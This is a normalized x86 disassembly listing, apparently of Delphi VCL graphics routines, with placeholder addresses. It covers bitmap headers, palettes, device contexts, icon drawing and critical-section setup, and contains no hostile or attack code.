mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d22c
call sub_424870
jmp r-xdata
xor eax eax
push ebp
push sub_429d62
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429cd6
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d9a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d22c
call sub_424870
jmp r-xdata
sub_429cd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027e4
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_429d9a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c68
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_429e2f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425080
mov [ ebp - 0x30 ] eax
sub_429e4c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_429800
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429e90
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429530
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41c490
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c68
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429800
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_429928
call sub_424870
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_429f00
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_429530
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c68
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_428b48
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_429f9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_429800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429fc4
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4293ec
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_429530
mov eax esi
call sub_429640
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_429530
mov eax esi
call sub_429640
mov eax esi
call sub_4294bc
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_428b48
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_428f4c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429800
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429800
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4284e4
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a0fc
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429540
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428f4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a150
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_429540
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_428f4c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a1d0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_429530
mov eax ebx
call sub_429540
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4284e4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a267
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4283dc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422718
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42a26c
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a08
call sub_403a5c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4283dc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a2a4
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_429540
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428f4c
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42a2f4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429540
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428f4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a350
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c68
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4294bc
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4257d4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c4c8
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c4c8
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c68
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_429380
mov dl [ r-xdata ]
call sub_42466c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424990
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_428498
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c4c8
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41c4c8
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c4c8
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41c4c8
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41c4c8
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41c4c8
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_424e00
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41c4c8
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425124
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42a608
push ebx
mov ebx eax
mov eax ebx
call sub_429540
mov edx ebx
mov eax ebx
call sub_42900c
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_42a63c
push ebx
mov ebx eax
mov eax ebx
call sub_429540
mov edx ebx
mov eax ebx
call sub_42900c
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_42a668
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_429540
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4284e4
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42a6e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_428b48
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a708
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42a750
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425b10
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428310
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a7a4
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428314
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42a7d4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42aaac
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_428310
mov eax [ esi + 0x28 ]
call sub_428314
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41abc8
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42a834
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_42466c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42a88c
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42a8c8
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41c284
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41c490
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4253d0
jmp r-xdata
jmp r-xdata
call sub_42487c
sub_42a940
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a9cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42a88c
cmp eax [ rw-data ]
jne r-xdata
call sub_42487c
mov eax esi
call sub_42a88c
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425914
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c68
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c4c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42a9f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42aa82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41c264
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41c490
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c490
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42aaac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_42487c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aa87
mov eax [ ebp - 0x4 ]
call sub_403254
call sub_403a08
call sub_403a5c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aaac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42aaec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428310
mov eax [ ebx + 0x28 ]
call sub_428314
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ab6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42a940
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41c4c8
pop esi
pop ebx
retn
sub_42abbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42abfd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_4265c8
mov ecx esi
mov edx ebx
call sub_42622c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac04
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_42ac0c
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_424ed0
mov [ rw-data ] eax
pop ebx
retn
sub_42ac44
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42ac88
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_40651c
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42ac44
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_40651c
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42ad54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42ad8c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_42af84
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42add0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42adb8
xor eax eax
push ebp
push sub_42ae71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae78
mov eax [ ebp - 0x4 ]
call sub_42adc4
retn
mov eax 0x10
call sub_4027c4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42ae84
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42ae84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42af63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
